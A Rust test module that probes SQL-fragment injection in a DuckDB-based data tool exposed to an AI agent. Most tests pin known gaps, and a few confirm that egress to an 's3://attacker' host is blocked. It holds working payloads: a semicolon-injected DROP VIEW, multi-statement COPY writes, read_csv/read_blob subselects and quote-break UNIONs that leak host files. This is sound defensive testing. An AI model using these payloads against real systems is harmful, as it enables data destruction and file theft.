// crates/droplet-core/src/security/sql_injection.rs
//! SQL-fragment injection through host-built SQL — adversarial angles. seam: the unsanitized `format!`-built fragments in `engine_duckdb.rs` (filter/group/with_column/sort/join/local_sql/register path).
#![allow(unused_imports)]
use super::{catch_dispatch, dispatch, list_len, sales_parquet, tmp_dir, write_parquet};
use crate::DropletError;
use crate::engine_duckdb::{DEFAULT_MAX_RESULT_ROWS, Dataset, DuckEngine};
use crate::registry::Registry;
use crate::session::Session;
use crate::tool::{Tool, ToolCx};
use monty::MontyObject;

#[cfg(test)]
mod tests {
    use super::*;

    /// `CANARY` (was PROBE) — FINDING: execute_batch multi-statement in new_view lets a WHERE fragment run a second DDL statement via `;`.
    /// OBSERVED: filter_rows WHERE '1=1; DROP VIEW ds_0' succeeds (r.is_ok()), the injected DROP fires.
    /// ORIGINAL INTENT (desired contract): r.is_err() — the CREATE VIEW wrap must contain the fragment (single-statement only).
    /// REFERENCES EXISTING GAP: same multi-statement execute_batch sink documented in writes_ddl.rs (Task 5 finding: new_view uses execute_batch).
    /// FINDING: multi-stmt injection reaches a NEW attack vector (DDL DROP via filter WHERE) through the same root cause.
    /// seam: engine_duckdb.rs new_view() execute_batch — filter_rows funnels WHERE {where_sql} through CREATE VIEW ds_n AS SELECT * FROM ds_k WHERE <frag>
    #[test]
    fn known_gap_multistmt_injection_via_filter_executes_arbitrary_ddl() {
        let dir = tmp_dir("mstmt-ddl");
        let p = sales_parquet(&dir);
        let mut s = Session::new("mstmt-ddl").unwrap();
        // Register two views: ds_0 (victim) and ds_1. The injected `; DROP VIEW ds_0` rides the
        // filter_rows WHERE fragment; new_view's execute_batch runs BOTH statements.
        s.run_code(&format!("victim = register({p:?})")).unwrap();
        let h = s.run_code(&format!("register({p:?})")).unwrap();
        assert!(matches!(h, MontyObject::Int(_)));
        let r = s.run_code(&format!(
            "filter_rows(register({p:?}), '1=1; DROP VIEW ds_0')"
        ));
        let _ = std::fs::remove_dir_all(&dir);
        // CANARY: asserts OBSERVED (gap) behavior — multi-stmt injection via filter WHERE succeeds today.
        // DESIRED (when fixed): r.is_err(). Fix: new_view must use conn.execute() (single statement), not execute_batch.
        assert!(
            r.is_ok(),
            "KNOWN-GAP canary: multi-statement injection via filter WHERE currently succeeds — execute_batch in new_view runs the second DDL (DROP) statement. Flips to is_err() when new_view is fixed to use single-statement execute()."
        );
    }

    /// `CANARY` (was PROBE) — FINDING: query() agent SQL is NOT parenthesized in the CREATE VIEW wrap, so a trailing `;COPY` statement executes and writes a local file.
    /// OBSERVED: wrote==true (the COPY TO file succeeds), r.is_ok() — the multi-statement slips through execute_batch.
    /// ORIGINAL INTENT (desired contract): wrote==false — the CREATE VIEW wrap must parenthesize agent SQL so `;` is a parse error.
    /// REFERENCES EXISTING GAP: same execute_batch multi-statement sink as writes_ddl.rs / new_view finding (Task 5). This confirms query() is an additional entry point.
    /// FINDING: query() is a DISTINCT write-escape entry point (separate from direct handle-tool injection) because local_sql omits the parens.
    /// seam: tools.rs query() -> engine.local_sql(): CREATE VIEW ds_n AS WITH data AS (...) <agent_sql> (NO outer parens around agent sql)
    #[test]
    fn known_gap_query_wrap_is_not_parenthesized_multistmt_copy_writes() {
        let dir = tmp_dir("query-mstmt");
        let p = sales_parquet(&dir);
        let leak = dir.join("query_leak.csv");
        let leak_s = leak.to_str().unwrap().to_string();
        let _ = std::fs::remove_file(&leak);
        let mut s = Session::new("query-mstmt").unwrap();
        // query()'s agent SQL is spliced as: CREATE VIEW ds_1 AS WITH data AS (SELECT * FROM ds_0) <sql>
        // A self-contained second statement (COPY of a literal SELECT) executes via execute_batch.
        let sql =
            format!("SELECT * FROM data; COPY (SELECT 1) TO '{leak_s}' (HEADER, DELIMITER ',')");
        let code = format!("query({p:?}, {sql:?})");
        let r = s.run_code(&code);
        let wrote = leak.exists();
        let _ = std::fs::remove_dir_all(&dir);
        let _ = r;
        // CANARY: asserts OBSERVED (gap) behavior — COPY TO local file succeeds today via execute_batch.
        // DESIRED (when fixed): wrote==false. Fix: local_sql must wrap agent SQL in parens (AS (<sql>)) so `;` is a parse error.
        assert!(
            wrote,
            "KNOWN-GAP canary: query() multi-statement COPY TO a local file currently SUCCEEDS via execute_batch; the CREATE VIEW wrap does not parenthesize agent SQL. Flips to !wrote when local_sql parenthesizes the agent subquery."
        );
    }

    /// `CANARY` — New exfil ANGLE on the accepted gap: reaches arbitrary file read through the filter_rows WHERE predicate (a subselect table function), distinct from query()'s top-level FROM read_csv canary already on file.
    /// seam: tools.rs filter_rows -> engine.filter_rows: SELECT * FROM ds WHERE {where_sql} — EXISTS subselect over read_csv
    #[test]
    fn filter_where_subselect_widens_local_read_canary() {
        let dir = tmp_dir("filter-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.csv");
        std::fs::write(&secret, "TOPSECRET\n").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("filter-read").unwrap();
        // WHERE fragment carries an EXISTS subselect over read_csv of a host file the agent owns no handle to.
        let where_sql = format!("EXISTS (SELECT 1 FROM read_csv('{secret_s}', header=false))");
        let code = format!("to_rows(filter_rows(register({p:?}), {where_sql:?}))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_ok(),
            "KNOWN-GAP canary: a WHERE-fragment EXISTS subselect can read an arbitrary host file (read_csv) — the accepted V1a local-FS read gap reached through filter_rows. Flips to is_err() when V3 scopes local reads."
        );
    }

    /// `CANARY` — Distinct exfil ANGLE: the derived-column expression seam projects file bytes as a column value that actually crosses to_rows — different gadget from a WHERE filter or a top-level read_csv FROM.
    /// seam: tools.rs with_column -> engine.local_sql: SELECT *, {expr} AS {name} FROM base — expr is a scalar subquery reading a host file
    #[test]
    fn with_column_expr_subselect_exfiltrates_file_contents_canary() {
        let dir = tmp_dir("wc-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.txt");
        std::fs::write(&secret, "TOPSECRET").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("wc-read").unwrap();
        // expr is a scalar subquery that reads the host file and projects its content as a new column,
        // which then crosses the boundary via to_rows -> the contents exfiltrate to the agent.
        let expr = format!("(SELECT min(column0) FROM read_csv('{secret_s}', header=false))");
        let code = format!("to_rows(with_column(register({p:?}), 'leaked', {expr:?}))");
        let out = s
            .run_code(&code)
            .expect("KNOWN GAP: file read via with_column expr currently succeeds");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            leaked.contains("TOPSECRET"),
            "KNOWN-GAP canary: with_column's expr fragment is a scalar subquery that reads + projects a host file's contents, exfiltrating them through to_rows. Flips when V3 scopes local FS."
        );
    }

    /// `CANARY` — Distinct exfil ANGLE through the aggregate-metric expression splice (the (alias, sql_expr) pair), separate from filter WHERE and with_column expr.
    /// seam: tools.rs group_agg -> engine.group_agg: SELECT {by}, {expr} AS {alias} ... GROUP BY {by} — metric expr is a file-reading scalar subquery
    #[test]
    fn group_agg_metric_subselect_reads_file_canary() {
        let dir = tmp_dir("gagg-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.csv");
        std::fs::write(&secret, "99\n").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("gagg-read").unwrap();
        let metric_expr = format!(
            "(SELECT CAST(min(column0) AS BIGINT) FROM read_csv('{secret_s}', header=false))"
        );
        let code = format!(
            "to_rows(group_agg(register({p:?}), ['region'], [('leaked', {metric_expr:?})]))"
        );
        let out = s
            .run_code(&code)
            .expect("KNOWN GAP: metric subquery file read currently succeeds");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            leaked.contains("99"),
            "KNOWN-GAP canary: group_agg metric-expr fragment reads a host file via subquery and the value exfiltrates through to_rows. Flips when V3 scopes local FS."
        );
    }

    /// `CANARY` — Attacks the ALIAS splice (vs the expr splice) in group_agg — a structurally different injection point that widens the result shape rather than reading files.
    /// seam: engine_duckdb.rs group_agg: cols.push(format!("{expr} AS {alias}")) — alias is an unsanitized SQL fragment
    #[test]
    fn group_agg_metric_alias_injects_extra_projected_column() {
        let dir = tmp_dir("gagg-alias");
        let p = sales_parquet(&dir);
        let mut s = Session::new("gagg-alias").unwrap();
        // alias = "x, COUNT(*) AS smuggled" makes the SELECT list project an EXTRA agent-chosen column.
        let code = format!(
            "to_rows(group_agg(register({p:?}), ['region'], [('x, COUNT(*) AS smuggled', 'SUM(amt)')]))"
        );
        let out = s.run_code(&code).expect("alias injection currently parses");
        let _ = std::fs::remove_dir_all(&dir);
        let MontyObject::List(items) = out else {
            panic!("expected rows")
        };
        let MontyObject::Dict(pairs) = &items[0] else {
            panic!("expected dict row")
        };
        let has_smuggled = pairs
            .clone()
            .into_iter()
            .any(|(k, _)| k == MontyObject::String("smuggled".into()));
        assert!(
            has_smuggled,
            "KNOWN-GAP canary: an unsanitized metric ALIAS injects an extra projected column ('smuggled'), proving the alias position is a SQL-fragment splice, not an identifier. Local-only (no egress/write) => CANARY; flips when aliases are validated as bare identifiers."
        );
    }

    /// `CANARY` — Distinct splice point: the GROUP BY by-column list (appears twice in the built SQL), separate from the metric expr/alias angles. Demonstrates expression injection rather than file read or write.
    /// seam: engine_duckdb.rs group_agg: by.join(", ") appears in BOTH the SELECT prefix and GROUP BY {by} — by-cols unsanitized
    #[test]
    fn group_agg_by_col_injects_grouping_expression() {
        let dir = tmp_dir("gagg-by");
        let p = sales_parquet(&dir);
        let mut s = Session::new("gagg-by").unwrap();
        // by = ['region', 'amt > 100'] injects an arbitrary grouping EXPRESSION (a predicate) into SELECT + GROUP BY.
        let code = format!(
            "to_rows(group_agg(register({p:?}), ['region', 'amt > 100'], [('n', 'COUNT(*)')]))"
        );
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_ok(),
            "KNOWN-GAP canary: a by-col entry is spliced verbatim into SELECT + GROUP BY, so 'amt > 100' becomes a grouping EXPRESSION (not a column), confirming the by-col position is a raw SQL fragment. Local-only => CANARY; flips when by-cols are validated as identifiers."
        );
    }

    /// `CANARY` — Attacks the JOIN ON predicate splice with a LOGIC injection (semantics change to cross join) rather than a file read or statement break — a distinct effect class for the same surface.
    /// seam: tools.rs join -> engine.local_sql: SELECT * FROM l JOIN r ON {on} — logic injection
    #[test]
    fn join_on_true_widens_inner_join_to_cross_join() {
        let dir = tmp_dir("join-on");
        let p = sales_parquet(&dir);
        let mut s = Session::new("join-on").unwrap();
        // 'on' is spliced raw. ON 'true' turns the intended inner join into a CROSS JOIN (cartesian).
        let code = format!("to_rows(join(register({p:?}), register({p:?}), 'true'))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_ok(),
            "KNOWN-GAP canary: the join ON fragment is raw SQL, so 'ON true' silently widens the inner join into a cartesian product — operation-semantics injection. Local-only (result still capped, no egress/write) => CANARY; flips if join predicates are ever structured/validated."
        );
    }

    /// `CANARY` — Distinct from the ON-'true' logic angle: uses the ON splice as a vehicle for the local-FS read gap via a type-matched subselect — a different exploitation of the same seam.
    /// seam: tools.rs join -> engine.local_sql: SELECT * FROM l JOIN r ON {on} — read_csv subselect in ON
    #[test]
    fn join_on_subselect_reads_host_file_canary() {
        let dir = tmp_dir("join-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.csv");
        std::fs::write(&secret, "EU\n").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("join-read").unwrap();
        // ON predicate carries a file read: l.region IN (SELECT column0 FROM read_csv('<secret>')).
        let on = format!("l.region IN (SELECT column0 FROM read_csv('{secret_s}', header=false))");
        let code = format!("to_rows(join(register({p:?}), register({p:?}), {on:?}))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_ok(),
            "KNOWN-GAP canary: the join ON fragment can host a read_csv subselect over an arbitrary host file (a VARCHAR column matches l.region, avoiding a type error). Confirms ON reaches the file-read gap. Flips when V3 scopes local FS."
        );
    }

    /// `CANARY` — Attacks the CTE-alias splice in local_sql — a structurally unique injection point (the alias becomes SQL between WITH and the body), distinct from every fragment/expr/predicate angle.
    /// seam: engine_duckdb.rs local_sql: format!("{alias} AS (SELECT * FROM {})") joined into WITH {ctes} {sql} — alias splice
    #[test]
    fn local_sql_alias_injects_second_cte() {
        let dir = tmp_dir("ls-alias");
        let p = sales_parquet(&dir);
        let mut s = Session::new("ls-alias").unwrap();
        // alias 'x AS (SELECT 42 AS a), evil' closes the generated CTE early and injects a second,
        // fully agent-controlled CTE 'evil'. The final sql then selects from it.
        let alias = "x AS (SELECT 42 AS a), evil";
        let code =
            format!("to_rows(local_sql('SELECT * FROM evil', [({alias:?}, register({p:?}))]))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_ok(),
            "KNOWN-GAP canary: the local_sql alias is spliced as raw SQL into the WITH clause, so it can close the generated CTE and inject a second agent-defined CTE. Local-only => CANARY; the engine's TODO(M2) flags validating aliases as bare identifiers. Flips when alias validation lands."
        );
    }

    /// `CANARY` — Attacks the FILENAME-string splice in read_parquet('{path}') — a different quoting context (inside a single-quoted SQL string literal) requiring a quote-break, unlike all the bare-fragment splices.
    /// seam: engine_duckdb.rs register_parquet: read_parquet('{path}') — TODO(M2) filename injection (single-quoted string-literal context)
    #[test]
    fn register_path_quote_break_unions_arbitrary_file_read_canary() {
        let dir = tmp_dir("reg-path");
        let p = sales_parquet(&dir);
        // A second parquet with the SAME schema (region VARCHAR, amt DOUBLE) to UNION in via the quote-break.
        let other = dir.join("other.parquet").to_str().unwrap().to_string();
        write_parquet(
            &other,
            "SELECT 'SMUGGLED' AS region, CAST(7.0 AS DOUBLE) AS amt",
        );
        let mut s = Session::new("reg-path").unwrap();
        // path closes read_parquet('...'), UNIONs an arbitrary read_parquet, and comments out the trailing ').
        let evil = format!("{p}') UNION ALL SELECT * FROM read_parquet('{other}') --");
        let code = format!("to_rows(register({evil:?}))");
        let out = s
            .run_code(&code)
            .expect("KNOWN GAP: path quote-break currently parses");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            leaked.contains("SMUGGLED"),
            "KNOWN-GAP canary: register_parquet splices the path into read_parquet('{{path}}') with no escaping, so a quote-break UNIONs in an arbitrary file the agent chose, widening the local read. Engine TODO(M2) flags this filename injection. Flips when the path is bound as a parameter (V3 load boundary)."
        );
    }

    /// `HOLDS` — The egress-via-injection counterpart to the file-read canary: proves the SAME injection that widens local read CANNOT widen to network egress — pins which half of the gap is contained.
    /// seam: engine_duckdb.rs register_parquet path splice vs invariant #3 (disabled_filesystems latch)
    #[test]
    fn register_path_quote_break_to_s3_still_blocks_egress() {
        let dir = tmp_dir("reg-egress");
        let p = sales_parquet(&dir);
        let mut s = Session::new("reg-egress").unwrap();
        // Same path quote-break, but the injected read targets s3:// — egress must be refused by the
        // disabled-filesystems latch, even though the injection itself parses.
        let evil =
            format!("{p}') UNION ALL SELECT * FROM read_parquet('s3://attacker/leak.parquet') --");
        let code = format!("to_rows(register({evil:?}))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "EGRESS CONTRACT HOLDS: even a successful filename injection cannot reach s3://; the disabled_filesystems one-way latch + no-autoload httpfs make read_parquet('s3://...') fail at the engine with no network round-trip."
        );
    }

    /// `HOLDS` — Pairs with the multi-statement WRITE finding to isolate the blast radius: the same multi-statement gadget that writes a local file is still walled off from network egress — a distinct contract (egress) on the same gadget.
    /// seam: engine_duckdb.rs new_view execute_batch multi-statement vs invariant #3 egress latch
    #[test]
    fn multistmt_injection_cannot_egress_to_s3_holds() {
        let dir = tmp_dir("mstmt-egress");
        let p = sales_parquet(&dir);
        let mut s = Session::new("mstmt-egress").unwrap();
        // Multi-statement injection that tries to COPY out to s3 — must be refused by the disabled-filesystems latch.
        let sql = "SELECT * FROM data; COPY (SELECT 1) TO 's3://attacker/leak.csv'";
        let code = format!("query({p:?}, {sql:?})");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err(),
            "EGRESS CONTRACT HOLDS: even with the multi-statement COPY-write bypass, COPY ... TO 's3://...' is refused by the disabled_filesystems latch (no httpfs autoload). The injection can write LOCAL files but cannot reach the network."
        );
    }

    /// `CANARY` — Attacks the ORDER BY splice specifically — a distinct clause from WHERE/SELECT/GROUP BY/ON, accepting subquery/expression fragments where a column list is the intended contract.
    /// seam: tools.rs sort -> engine.local_sql: SELECT * FROM base ORDER BY {by}
    #[test]
    fn sort_orderby_subselect_fragment_executes() {
        let dir = tmp_dir("sort-inj");
        let p = sales_parquet(&dir);
        let mut s = Session::new("sort-inj").unwrap();
        // 'by' is raw SQL after ORDER BY. A scalar subquery is accepted, proving the order list is an arbitrary fragment.
        let code = format!("to_rows(sort(register({p:?}), '(SELECT 1) DESC, region'))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_ok(),
            "KNOWN-GAP canary: the sort 'by' fragment is spliced raw after ORDER BY and accepts arbitrary expressions/subqueries, confirming it is an unsanitized SQL fragment. Local-only, capped result, no egress/write => CANARY; flips if the order list is ever validated."
        );
    }

    /// `HOLDS` — Negative-space probe distinguishing two write vectors: statement-in-expression (rejected, HOLDS) vs statement-after-semicolon (executes, the finding). Sharpens the root cause to execute_batch, not the splice.
    /// seam: engine_duckdb.rs filter_rows WHERE {where_sql} — single-statement parser boundary (statement-in-expression)
    #[test]
    fn filter_where_copy_to_inside_expression_is_rejected_holds() {
        let dir = tmp_dir("filter-copy");
        let p = sales_parquet(&dir);
        let leak = dir.join("expr_copy.csv");
        let leak_s = leak.to_str().unwrap().to_string();
        let _ = std::fs::remove_file(&leak);
        let mut s = Session::new("filter-copy").unwrap();
        // Smuggle a COPY (a statement) into an EXPRESSION position inside WHERE, WITHOUT a `;` separator.
        // DuckDB rejects COPY as a sub-expression, so this single-statement path cannot write — the write
        // only happens via the multi-statement `;` bug. Use a self-contained COPY (SELECT 1) so the ONLY
        // failure reason is the parser, not an unknown table name.
        let where_sql = format!("(COPY (SELECT 1) TO '{leak_s}')");
        let code = format!("to_rows(filter_rows(register({p:?}), {where_sql:?}))");
        let r = s.run_code(&code);
        let wrote = leak.exists();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            r.is_err() && !wrote,
            "WRITE CONTRACT (single-statement): a COPY/statement cannot be smuggled into an EXPRESSION position inside a WHERE fragment — the parser rejects it and no file is written. This isolates the write escape to the multi-statement ';' path, not the fragment-as-expression path."
        );
    }

    /// `CANARY` — The existing register quote-break canary unions another PARQUET; this pivots the SAME path-splice to read_blob() of an ARBITRARY host file (the strongest, format-free local-read primitive) — a distinct exfil angle reaching the V1a gap through the register PATH position rather than the SQL body. CANARY per the accepted-gap rule, marked as a NEW distinct exfil ANGLE.
    /// seam: (gap-fill, coverage critic)
    #[test]
    fn register_path_quote_break_pivots_to_read_blob_arbitrary_file_canary() {
        let dir = tmp_dir("reg-path-blob");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.bin");
        std::fs::write(&secret, b"TOPSECRET-BLOB").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("reg-path-blob").unwrap();
        // Close read_parquet('...'), UNION a read_blob() of an ARBITRARY non-parquet host file, comment the tail.
        // read_blob returns BLOB; cast its content to VARCHAR for `region` and a constant `amt` so it schema-matches.
        let evil = format!(
            "{p}') UNION ALL SELECT CAST(content AS VARCHAR) AS region, CAST(0.0 AS DOUBLE) AS amt FROM read_blob('{secret_s}') --"
        );
        let code = format!("to_rows(register({evil:?}))");
        let out = s.run_code(&code).expect("KNOWN GAP: register path quote-break + read_blob of an arbitrary file currently parses");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            leaked.contains("TOPSECRET-BLOB"),
            "KNOWN-GAP canary: the register PATH splice (read_parquet('{{path}}')) can quote-break and UNION in read_blob() of an ARBITRARY non-parquet host file, exfiltrating its bytes through to_rows. Distinct from the parquet-union canary: this pivots the PATH position to the generic read_blob local-read primitive (V1a gap), proving the splice is not limited to parquet readers. Flips when the path is bound as a parameter at the V3 load boundary."
        );
    }
}
